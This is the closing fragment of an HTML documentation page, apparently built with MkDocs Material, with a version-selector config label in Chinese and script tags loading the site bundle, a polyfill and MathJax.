"\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "version": {"default": "latest", "provider": "mike"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
    
  </body>
</html>